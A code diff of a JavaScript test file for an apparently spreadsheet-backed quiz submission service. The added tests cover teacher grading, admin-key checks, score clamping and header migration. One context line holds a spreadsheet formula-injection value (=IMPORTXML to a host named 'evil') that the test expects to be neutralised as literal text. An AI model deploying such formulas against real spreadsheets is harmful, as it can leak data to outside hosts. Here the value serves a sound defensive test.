@@ -113,8 +113,9 @@ test('first submission creates both sheets with formatted headers', () => {
   assert.deepEqual([...s.rows[0]], [
     'Timestamp', 'Submission ID', 'Student Name', 'Student Email', 'Test Code', 'Test Title', 'Score Achieved', 'Total Score',
     'Percentage (%)', 'Duration (s)', 'Tab Switches', 'Auto Submitted', 'Detailed Responses (JSON)', 'Flags (JSON)',
+    'Status', 'Final Score', 'Final Percentage (%)', 'Grades (JSON)', 'Graded At', 'Teacher Note',
   ]);
-  assert.ok(s.formats.some((f) => f.weight === 'bold' && f.r === 1 && f.nc === 14));
+  assert.ok(s.formats.some((f) => f.weight === 'bold' && f.r === 1 && f.nc === 20));
   assert.ok(s.formats.some((f) => f.bg === '#E2E8F0'));
 });
 
@@ -288,4 +289,64 @@ test('student-supplied text starting with a formula character is stored as liter
   assert.equal(row[2], `'=IMPORTXML("http://evil","//a")`);
   assert.equal(row[3], "'+x@y.org");
   assert.equal(row[5], "'@title");
+});
+
+// ---- Grading ----
+const shortResponses = [
+  { questionId: 'q1', type: 'mcq', answered: true, isCorrect: true, pointsEarned: 1, pointsPossible: 1 },
+  { questionId: 'q2', type: 'short', answered: true, isCorrect: false, pointsEarned: 0, pointsPossible: 4, needsGrading: true },
+];
+
+test('auto-graded submission is marked Auto-graded with a final score', () => {
+  post(sample());
+  const row = sheets.get('Submissions').rows[1];
+  assert.deepEqual([...row.slice(14, 17)], ['Auto-graded', 5, 71.43]);
+});
+
+test('submission with open-ended answers is marked Needs grading with no final score', () => {
+  post(sample({ responses: shortResponses, score_achieved: 1, score_total: 5, percentage: '20.00' }));
+  const row = sheets.get('Submissions').rows[1];
+  assert.deepEqual([...row.slice(14, 17)], ['Needs grading', '', '']);
+  const res = post({ action: 'getResults', adminKey: 'secret' });
+  assert.equal(res.rows[0].status, 'Needs grading');
+  assert.equal(res.rows[0].final_score, null);
+});
+
+test('saveGrade requires the admin key', () => {
+  post(sample({ responses: shortResponses }));
+  assert.equal(post({ action: 'saveGrade', adminKey: 'nope', submissionId: 'sub-1', grades: { q2: 3 } }).error, 'unauthorized');
+});
+
+test('saveGrade recomputes the final score server-side and clamps points', () => {
+  post(sample({ responses: shortResponses, score_achieved: 1, score_total: 5 }));
+  const r = post({ action: 'saveGrade', adminKey: 'secret', submissionId: 'sub-1', grades: { q2: 3, bogus: 'x' }, note: '=SUM(A1)' });
+  assert.equal(r.result, 'success');
+  assert.equal(r.grade.final_score, 4);
+  assert.equal(r.grade.score_total, 5);
+  assert.equal(r.grade.final_percentage, 80);
+  const row = sheets.get('Submissions').rows[1];
+  assert.deepEqual([...row.slice(14, 18)], ['Graded', 4, 80, '{"q2":3}']);
+  assert.equal(row[19], "'=SUM(A1)");
+  // Over-max and negative points are clamped; overrides of auto-graded questions are allowed.
+  const c = post({ action: 'saveGrade', adminKey: 'secret', submissionId: 'sub-1', grades: { q1: -2, q2: 99 } });
+  assert.equal(c.grade.final_score, 4);
+  const res = post({ action: 'getResults', adminKey: 'secret' }).rows[0];
+  assert.equal(res.status, 'Graded');
+  assert.deepEqual(res.grades, { q1: -2, q2: 99 });
+  assert.equal(res.final_score, 4);
+});
+
+test('saveGrade on an unknown submission is not_found', () => {
+  assert.equal(post({ action: 'saveGrade', adminKey: 'secret', submissionId: 'nope', grades: {} }).error, 'not_found');
+});
+
+test('older 14-column sheets get the new grading headers added', () => {
+  const s = makeSheet('Submissions');
+  s.rows.push(['Timestamp', 'Submission ID', 'Student Name', 'Student Email', 'Test Code', 'Test Title', 'Score Achieved', 'Total Score',
+    'Percentage (%)', 'Duration (s)', 'Tab Switches', 'Auto Submitted', 'Detailed Responses (JSON)', 'Flags (JSON)']);
+  sheets.set('Submissions', s);
+  post(sample());
+  assert.equal(s.rows[0].length, 20);
+  assert.equal(s.rows[0][14], 'Status');
+  assert.equal(s.rows[0][19], 'Teacher Note');
 });
